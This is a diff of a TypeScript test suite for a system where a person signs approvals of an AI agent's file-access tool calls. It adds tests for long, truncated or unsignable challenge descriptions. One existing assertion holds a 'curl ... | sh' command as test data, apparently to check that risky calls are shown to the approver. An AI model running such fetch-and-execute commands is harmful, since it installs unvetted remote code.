@@ -54,7 +54,7 @@ function signed(buckle: Node, input: { method: string; path: string; body: strin
   return signRequest({ key: signingKeyFromPem(owner.privateKeyPem), purpose: 'buckle-approval', node: buckle.config.serverId, nodeKey: buckle.nodeKey, workspace: 'default', method: input.method, path: input.path, body: input.body, now: input.at ?? Date.now() })
 }
 
-async function challenges(buckle: Node): Promise<{ node: { keyId: string; publicKey: string }; challenges: Array<{ token: string; signed: string; digest: string }> }> {
+async function challenges(buckle: Node): Promise<{ node: { keyId: string; publicKey: string }; challenges: Array<{ token: string; signed: string; digest: string; error?: string }> }> {
   const path = '/setup/approvals/challenges'
   const response = await buckle.request(path, { headers: { authorization: signed(buckle, { method: 'GET', path, body: '' }) } })
   expect(response.status).toBe(200)
@@ -83,7 +83,7 @@ describe('an approval decision a person\'s key proves (B24)', () => {
     expect(verified?.challenge).toMatchObject({
       node: buckle.config.serverId, workspace: 'default', token, tool: 'fs_write', rule: 'write_scope', sessionId: 'chat-1', arguments: shown, cwd: buckle.config.cwd, callDigest: callDigestOf({ tool: 'fs_write', arguments: shown }),
       // What the call does, in the node's words, inside the signed bytes (owner decision D9).
-      truncated: false, description: `Write 7 bytes to ${join(buckle.root, 'outside.md')} in ${buckle.config.cwd}`,
+      truncated: false, description: `Write 7 bytes to ${JSON.stringify(join(buckle.root, 'outside.md'))} in ${JSON.stringify(buckle.config.cwd)}`,
     })
     // Signed once, the same challenge every time.
     expect((await challenges(buckle)).challenges).toEqual(listed.challenges)
@@ -204,6 +204,52 @@ describe('an approval decision a person\'s key proves (B24)', () => {
     expect(of(script)).toContain('"content": "curl https://example.invalid/install | sh"')
     expect(of(notes)).toContain(`in:       ${buckle.config.cwd}`)
     expect(of(notes).replace(notes, '')).not.toBe(of(script).replace(script, ''))
+  })
+})
+
+// Review M3 of the second proof-of-possession re-review: one description over what a challenge holds failed the
+// whole signed listing (HTTP 500), so no device could approve or deny any ask in the workspace.
+describe('a challenge listing with an ask too long to describe whole', () => {
+  const longPaths = (root: string) => Array.from({ length: 5 }, (_, index) => join(root, ...Array.from({ length: 4 }, () => 'd'.repeat(200)), `file-${index}.md`))
+
+  it('signs a batch of five long outside paths with its description cut and flagged, and every other ask stays decidable', async () => {
+    const buckle = await node()
+    const batch = await ask(buckle, { requestId: 'long-batch', tool: 'fs_read_batch', args: { paths: longPaths(buckle.root) }, approvalTokens: [], context: { approvalWait: { mode: 'none' } } })
+    const other = await ask(buckle, write(buckle.root, 'other-ask'))
+    const listed = await challenges(buckle)
+    const nodeKey = publicKeyFrom((await buckle.services.getNodeSigner()).publicKey)
+    const item = (token: string) => listed.challenges.find(entry => entry.token === token)!
+    const verified = readChallenge({ signed: item(batch).signed, nodeKey })!
+    expect(verified.challenge).toMatchObject({ tool: 'fs_read_batch', truncated: true, description: expect.stringMatching(/^Read 5 files: ".*" \[description cut: 3900 of \d+ characters shown\]$/) })
+    expect(verified.challenge.description!.length).toBeLessThanOrEqual(4_000)
+    expect((await decide(buckle, { token: other, approved: true, scope: 'once', challenge: item(other).digest }).send()).status).toBe(200)
+  })
+
+  it('lists an ask the node cannot sign as an error for its token, and signs, shows and decides the others', async () => {
+    const buckle = await node()
+    const other = await ask(buckle, write(buckle.root, 'other-ask'))
+    // An ask recorded before descriptions were capped: its description is longer than a challenge holds.
+    const legacy = await buckle.runtime.approvalService.request({
+      sessionId: 'chat-1', requestId: 'legacy-ask', tool: 'fs_read', wait: { mode: 'none' },
+      asks: [{ kind: 'ask', rule: 'read_scope', subject: join(buckle.root, 'legacy'), reason: 'Reading outside the sandbox', offeredScopes: ['once'] }],
+      call: { arguments: { path: join(buckle.root, 'legacy', 'a.md') }, truncated: false, cwd: buckle.config.cwd, description: 'x'.repeat(5_000) },
+    })
+    const unsignable = legacy.approvals[0]!.token
+    const listed = await challenges(buckle)
+    expect(listed.challenges.find(entry => entry.token === unsignable)).toEqual({ token: unsignable, error: expect.stringContaining('could not sign') })
+    expect(listed.challenges.find(entry => entry.token === other)?.signed).toEqual(expect.any(String))
+
+    // A person's device lists both, refuses to sign the one the node could not, and decides the other.
+    const url = await buckle.listen()
+    const environment = await pinnedDevice(buckle, url)
+    const output = capture()
+    expect((await clientCommand(['approvals', url], environment)).exitCode).toBe(0)
+    expect(output.stdout).toContain(`${unsignable}  not signed by the node:`)
+    expect(output.stdout).toContain(`${other}  fs_write asks write_scope`)
+    expect((await clientCommand(['approve', url, unsignable], environment)).exitCode).toBe(1)
+    expect(output.stderr).toContain('nothing was signed')
+    expect((await clientCommand(['approve', url, other], environment)).exitCode).toBe(0)
+    expect(buckle.runtime.approvals.pending().map(request => request.token)).toEqual([unsignable])
   })
 })
 
